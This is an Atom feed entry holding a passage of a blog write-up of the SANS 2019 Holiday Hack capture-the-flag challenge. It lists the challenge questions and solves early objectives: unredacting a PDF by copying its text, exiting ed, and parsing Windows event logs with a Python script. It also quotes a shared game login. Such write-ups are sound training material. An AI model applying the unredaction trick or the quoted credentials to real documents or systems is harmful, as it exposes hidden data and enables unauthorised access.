<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>All Your Base Are Belong To Me</title><link href="https://allyourbase.utouch.fr/" rel="alternate"></link><link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" rel="self"></link><id>https://allyourbase.utouch.fr/</id><updated>2020-01-14T00:00:00+01:00</updated><entry><title>SANS Christmas Challenge 2019</title><link href="https://allyourbase.utouch.fr/posts/2020/01/14/sans-christmas-challenge-2019/" rel="alternate"></link><published>2020-01-14T00:00:00+01:00</published><updated>2020-01-14T00:00:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2020-01-14:/posts/2020/01/14/sans-christmas-challenge-2019/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2019_logo.png" class="align-center" src="/images/sans-christmas-challenge-2019/sans_christmas_challenge_2019_logo.png" /&gt;
&lt;p&gt;On the twelfth day of Christmas, my true love gave to me:&lt;/p&gt;
&lt;p&gt;Twelve Phishers phishing&lt;/p&gt;
&lt;p&gt;Eleven Shells a-popping&lt;/p&gt;
&lt;p&gt;Ten Passwords spraying&lt;/p&gt;
&lt;p&gt;Nine Splunks a-splunking&lt;/p&gt;
&lt;p&gt;Eight Machines learning&lt;/p&gt;
&lt;p&gt;Seven Metasploit scanning&lt;/p&gt;
&lt;p&gt;Six Blue Teamers crying&lt;/p&gt;
&lt;p&gt;Five Golden Tickets&lt;/p&gt;
&lt;p&gt;Four Domain Hashes&lt;/p&gt;
&lt;p&gt;Three Malicious Macros&lt;/p&gt;
&lt;p&gt;Two LAN Turtles&lt;/p&gt;
&lt;p&gt;and a Pwnage in …&lt;/p&gt;</summary><content type="html">&lt;img alt="sans_christmas_challenge_2019_logo.png" class="align-center" src="/images/sans-christmas-challenge-2019/sans_christmas_challenge_2019_logo.png" /&gt;
&lt;p&gt;On the twelfth day of Christmas, my true love gave to me:&lt;/p&gt;
&lt;p&gt;Twelve Phishers phishing&lt;/p&gt;
&lt;p&gt;Eleven Shells a-popping&lt;/p&gt;
&lt;p&gt;Ten Passwords spraying&lt;/p&gt;
&lt;p&gt;Nine Splunks a-splunking&lt;/p&gt;
&lt;p&gt;Eight Machines learning&lt;/p&gt;
&lt;p&gt;Seven Metasploit scanning&lt;/p&gt;
&lt;p&gt;Six Blue Teamers crying&lt;/p&gt;
&lt;p&gt;Five Golden Tickets&lt;/p&gt;
&lt;p&gt;Four Domain Hashes&lt;/p&gt;
&lt;p&gt;Three Malicious Macros&lt;/p&gt;
&lt;p&gt;Two LAN Turtles&lt;/p&gt;
&lt;p&gt;and a Pwnage in a Pear Tree&lt;/p&gt;
&lt;p&gt;Here's my write-up for the &lt;a class="reference external" href="https://holidayhackchallenge.com/2019/"&gt;2019 SANS Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;div class="contents topic" id="table-of-contents"&gt;
&lt;p class="topic-title first"&gt;Table of contents&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference internal" href="#introduction" id="id1"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-0-talk-to-santa-in-the-quad" id="id2"&gt;Objective 0: Talk to Santa in the Quad&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-1-find-the-turtle-doves" id="id3"&gt;Objective 1: Find the Turtle Doves&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-2-unredact-threatening-document" id="id4"&gt;Objective 2: Unredact Threatening Document&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-3" id="id5"&gt;Objective 3:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#bushy-evergreen-s-cranberry-pi-challenge" id="id6"&gt;Bushy Evergreen's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#windows-log-analysis-evaluate-attack-outcome" id="id7"&gt;Windows Log Analysis: Evaluate Attack Outcome&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-4" id="id8"&gt;Objective 4:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#sugarplum-mary-s-cranberry-pi-challenge" id="id9"&gt;SugarPlum Mary's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#windows-log-analysis-determine-attacker-technique" id="id10"&gt;Windows Log Analysis: Determine Attacker Technique&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-5" id="id11"&gt;Objective 5:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#sparkle-redberry-s-canberry-pi-challenge" id="id12"&gt;Sparkle Redberry's Canberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#network-log-analysis-determine-compromised-system" id="id13"&gt;Network Log Analysis: Determine Compromised System&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-6-splunk" id="id14"&gt;Objective 6: Splunk&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#answering-the-challenge-question" id="id15"&gt;Answering the challenge question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#answering-the-training-questions" id="id16"&gt;Answering the training questions&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#first-question" id="id17"&gt;First question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#second-question" id="id18"&gt;Second question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#third-question" id="id19"&gt;Third question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#fourth-question" id="id20"&gt;Fourth question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#fifth-question" id="id21"&gt;Fifth question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#sixth-question" id="id22"&gt;Sixth question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#seventh-question" id="id23"&gt;Seventh question&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-7" id="id24"&gt;Objective 7:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-dorm-room-s-keypad" id="id25"&gt;The Dorm Room's Keypad&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#minty-candy-cane-s-cranberry-pi-challenge" id="id26"&gt;Minty Candy Cane's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#get-access-to-the-steam-tunnels" id="id27"&gt;Get Access To The Steam Tunnels&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-8" id="id28"&gt;Objective 8:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#alabaster-snowball-s-cranberry-pi-challenge" id="id29"&gt;Alabaster Snowball's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#bypassing-the-frido-sleigh-capteha" id="id30"&gt;Bypassing the Frido Sleigh CAPTEHA&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-9" id="id31"&gt;Objective 9:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#pepper-minstix-s-cranberry-pi-challenge" id="id32"&gt;Pepper Minstix's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#retrieve-scraps-of-paper-from-server" id="id33"&gt;Retrieve Scraps of Paper from Server&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-10" id="id34"&gt;Objective 10:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#holly-evergreen-s-cranberry-pi-challenge" id="id35"&gt;Holly Evergreen's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#recover-cleartext-document" id="id36"&gt;Recover Cleartext Document&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-11" id="id37"&gt;Objective 11:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#kent-tinseltooth-s-cranberry-pi-challenge" id="id38"&gt;Kent Tinseltooth's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#open-the-sleigh-shop-door" id="id39"&gt;Open the Sleigh Shop Door&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#objective-12" id="id40"&gt;Objective 12:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#wunorse-openslae-s-cranberry-pi-challenge" id="id41"&gt;Wunorse Openslae's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#filter-out-poisoned-sources-of-weather-data" id="id42"&gt;Filter Out Poisoned Sources of Weather Data&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#conclusion" id="id43"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#answer-to-the-questions" id="id44"&gt;Answer to the questions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id1"&gt;Introduction&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Santa is organizing a new KringleCon, with new speakers and all that! It's
taking place at Elf University.&lt;/p&gt;
&lt;img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2019/santa.png" /&gt;
&lt;p&gt;&lt;em&gt;Santa says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to the North Pole and KringleCon 2!&lt;/p&gt;
&lt;p&gt;Last year, KringleCon hosted over 17,500 attendees and my castle got a
little crowded.&lt;/p&gt;
&lt;p&gt;We moved the event to Elf University (Elf U for short), the North Pole’s
largest venue.&lt;/p&gt;
&lt;p&gt;Please feel free to explore, watch talks, and enjoy the con!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Here are the questions we must answer:&lt;/p&gt;
&lt;ol class="arabic"&gt;
&lt;li&gt;&lt;p class="first"&gt;Someone sent a threatening letter to Elf University. What is the first word
in ALL CAPS in the subject line of the letter? Please find the letter in the
Quad.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;We're seeing attacks against the Elf U domain! Using the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/Security.evtx.zip"&gt;event log data&lt;/a&gt;,
identify the user account that the attacker compromised using a password
spray attack.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Using &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/sysmon-data.json.zip"&gt;these normalized Sysmon logs&lt;/a&gt;,
identify the tool the attacker used to retrieve domain password hashes from
the lsass.exe process.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;The attacks don't stop! Can you help identify the IP address of the
malware-infected system using these &lt;a class="reference external" href="https://downloads.elfu.org/elfu-zeeklogs.zip"&gt;Zeek logs&lt;/a&gt;?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Access &lt;a class="reference external" href="https://splunk.elfu.org/"&gt;https://splunk.elfu.org/&lt;/a&gt; as &lt;code&gt;elf&lt;/code&gt; with password
&lt;code&gt;elfsocks&lt;/code&gt;. What was the message for Kent that the adversary embedded
in this attack? The SOC folks at that link will help you along!&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Gain access to the steam tunnels. Who took the turtle doves? Please tell us
their first and last name.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Help Krampus beat the &lt;a class="reference external" href="https://fridosleigh.com/"&gt;Frido Sleigh contest&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Gain access to the data on the &lt;a class="reference external" href="https://studentportal.elfu.org/"&gt;Student Portal&lt;/a&gt;
server and retrieve the paper scraps hosted there. What is the name of
Santa's cutting-edge sleigh guidance system?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;The Elfscrow Crypto tool is a vital asset used at Elf University for
encrypting SUPER SECRET documents. We can't send you the source, but we do
have debug symbols that you can use.&lt;/p&gt;
&lt;p&gt;Recover the plaintext content for this encrypted document. We know that it
was encrypted on December 6, 2019, between 7pm and 9pm UTC.&lt;/p&gt;
&lt;p&gt;What is the middle line on the cover page? (Hint: it's five words)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Visit Shinny Upatree in the Student Union and help solve their problem.
What is written on the paper you retrieve for Shinny?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Use the data supplied in the Zeek JSON logs to identify the IP addresses of
attackers poisoning Santa's flight mapping software. &lt;a class="reference external" href="https://srf.elfu.org/"&gt;Block the 100
offending sources of information to guide Santa's sleigh&lt;/a&gt;
through the attack. Submit the Route ID (&amp;quot;RID&amp;quot;) success value that you're
given.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now, this year I did use some hints, because there were some questions that
were outside my domain of expertise. So I thought I wouldn't restrict myself,
so that I could get to the end of the challenge. Anyway, let's get to it!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-0-talk-to-santa-in-the-quad"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id2"&gt;Objective 0: Talk to Santa in the Quad&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The first objective is to talk to Santa in the Quad.&lt;/p&gt;
&lt;img alt="santa_squad.png" class="align-center" src="/images/sans-christmas-challenge-2019/santa_squad.png" /&gt;
&lt;p&gt;&lt;em&gt;Santa says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This is a little embarrassing, but I need your help.&lt;/p&gt;
&lt;p&gt;Our KringleCon turtle dove mascots are missing!&lt;/p&gt;
&lt;p&gt;They probably just wandered off.&lt;/p&gt;
&lt;p&gt;Can you please help find them?&lt;/p&gt;
&lt;p&gt;To help you search for them and get acquainted with KringleCon, I’ve
created some objectives for you. You can see them in your badge.&lt;/p&gt;
&lt;p&gt;Where's your badge? Oh! It's that big, circle emblem on your chest - give
it a tap!&lt;/p&gt;
&lt;p&gt;We made them in two flavors - one for our new guests, and one for those
who've attended both KringleCons.&lt;/p&gt;
&lt;p&gt;After you find the Turtle Doves and complete objectives 2-5, please come
back and let me know.&lt;/p&gt;
&lt;p&gt;Not sure where to start? Try hopping around campus and talking to some
elves.&lt;/p&gt;
&lt;p&gt;If you help my elves with some quicker problems, they'll probably remember
clues for the objectives.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Alright, so the KringleCon's mascots are missing and we must find them. There
are also some more objectives we must fulfill before coming back to Santa.
Let's look for the missing turtle doves!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-1-find-the-turtle-doves"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id3"&gt;Objective 1: Find the Turtle Doves&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The two turtle doves are simply in the student union building, next to the
chimney.&lt;/p&gt;
&lt;img alt="turtledoves.png" class="align-center" src="/images/sans-christmas-challenge-2019/turtledoves.png" /&gt;
&lt;p&gt;&lt;em&gt;Michael and Jane, the turtle doves, say&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
Hoot Hooot?&lt;/blockquote&gt;
&lt;p&gt;Let's go back to the squad to tell Santa.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-2-unredact-threatening-document"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id4"&gt;Objective 2: Unredact Threatening Document&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;In a corner of the squad, we find &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/LetterToElfUPersonnel.pdf"&gt;a letter&lt;/a&gt;
addressed to the personnel of Elf U, with some redacted content.&lt;/p&gt;
&lt;p&gt;However, we can easily recover the redacted content by selecting the text, and
copying/pasting it into a text editor.&lt;/p&gt;
&lt;img alt="redacted_letter.png" class="align-center" src="/images/sans-christmas-challenge-2019/redacted_letter.png" /&gt;
&lt;p&gt;&lt;em&gt;Redacted letter says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Date: February 28, 2019&lt;/p&gt;
&lt;p&gt;To the Administration, Faculty, and Staff of Elf University
17 Christmas Tree Lane
North Pole&lt;/p&gt;
&lt;p&gt;From: A Concerned and Aggrieved Character&lt;/p&gt;
&lt;p&gt;Subject: DEMAND: Spread Holiday Cheer Confidential
to Other Holidays and Mythical Characters... OR
ELSE!&lt;/p&gt;
&lt;p&gt;Attention All Elf University Personnel,&lt;/p&gt;
&lt;p&gt;It remains a constant source of frustration that Elf University and the
entire operation at the North Pole focuses exclusively on Mr. S. Claus and
his year-end holiday spree. We URGE you to consider lending your
considerable resources and expertise in providing merriment, cheer, toys,
candy, and much more to other holidays year-round, as well as to other
mythical Confidential characters.&lt;/p&gt;
&lt;p&gt;For centuries, we have expressed our frustration at your lack of
willingness to spread your cheer beyond the inaptly-called “Holiday
Season.” There are many other perfectly fine holidays and mythical
characters that need your direct support year-round.&lt;/p&gt;
&lt;p&gt;If you do not accede to our demands, we will be forced to take matters into
our own hands.  We do not make this threat lightly. You have less than six
months to act demonstrably.&lt;/p&gt;
&lt;p&gt;Sincerely,&lt;/p&gt;
&lt;p class="attribution"&gt;&amp;mdash;A Concerned and Aggrieved Character&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-3"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id5"&gt;Objective 3:&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="bushy-evergreen-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id6"&gt;Bushy Evergreen's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Bushy is still having problem exiting his editor. But this one is an old one.&lt;/p&gt;
&lt;pre class="literal-block"&gt;
                  ........................................
               .;oooooooooooool;,,,,,,,,:loooooooooooooll:
             .:oooooooooooooc;,,,,,,,,:ooooooooooooollooo:
           .';;;;;;;;;;;;;;,''''''''';;;;;;;;;;;;;,;ooooo:
         .''''''''''''''''''''''''''''''''''''''''';ooooo:
       ;oooooooooooool;''''''',:loooooooooooolc;',,;ooooo:
    .:oooooooooooooc;',,,,,,,:ooooooooooooolccoc,,,;ooooo:
  .cooooooooooooo:,''''''',:ooooooooooooolcloooc,,,;ooooo,
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;ooo,
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;l'
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,..
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc.
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooo:.
  coooooooooooooo,,,,,,,,,;ooooooooooooooloo;
  :llllllllllllll,'''''''';llllllllllllllc,
Oh, many UNIX tools grow old, but this one's showing gray.
That Pepper LOLs and rolls her eyes, sends mocking looks my way.
I need to exit, run - get out! - and celebrate the yule.
Your challenge is to help this elf escape this blasted tool.
-Bushy Evergreen
Exit ed.
1100
&lt;/pre&gt;
&lt;p&gt;So, we need to exit &lt;code&gt;ed&lt;/code&gt;. I don't know this editor, so I had to search
how to exit it. &lt;a class="reference external" href="https://www.computerhope.com/unix/ued.htm"&gt;Apparently&lt;/a&gt;,
just inputing &lt;code&gt;q&lt;/code&gt; is enough:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
1100
q
Loading, please wait......
You did it! Congratulations!
elf&amp;#64;6f68f4ebb298:~$
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="windows-log-analysis-evaluate-attack-outcome"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id7"&gt;Windows Log Analysis: Evaluate Attack Outcome&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Apparently, the person who wrote the threat letter is serious, because we have
reports saying that there are ongoing attacks against the Elf U domain. We're
given the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/Security.evtx.zip"&gt;event logs&lt;/a&gt;,
and tasked to find the account that was compromised using the password spray
attack.&lt;/p&gt;
&lt;p&gt;In order to have a format that is more easy to parse, we can use &lt;a class="reference external" href="https://github.com/williballenthin/python-evtx/"&gt;python-evtx&lt;/a&gt; to convert the
&lt;code&gt;.evtx&lt;/code&gt; to an XML file. There is an &lt;a class="reference external" href="https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py"&gt;evtx_dump.py&lt;/a&gt;
script to do so:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; evtx_dump.py Security.evtx &amp;gt; Security_evtx.xml
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's take a look at the &lt;code&gt;EventIDs&lt;/code&gt; in this file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep EventID Security_evtx.xml &lt;span class="p"&gt;|&lt;/span&gt; sort &lt;span class="p"&gt;|&lt;/span&gt; uniq -c &lt;span class="p"&gt;|&lt;/span&gt; sort -n
&lt;span class="go"&gt;      1             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;1102&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;      1             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4616&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;      2             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4768&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;      4             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4776&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;      5             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4769&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     15             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4634&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;     16             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4624&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;     16             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4672&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   2386             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4625&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   2387             &amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4648&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The most interesting is 4624, because it's the one that says that &lt;a class="reference external" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624"&gt;an account
was successfully logged on&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let's create a small Python script to list every accounts with an
&lt;code&gt;EventID&lt;/code&gt; of 4624:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bs4&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usage: {} &amp;lt;security_evtx.xml&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;security_evtx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;lxml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;users_success_login_attempt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;security_evtx&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;event&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eventid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;contents&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;4624&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;users_success_login_attempt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
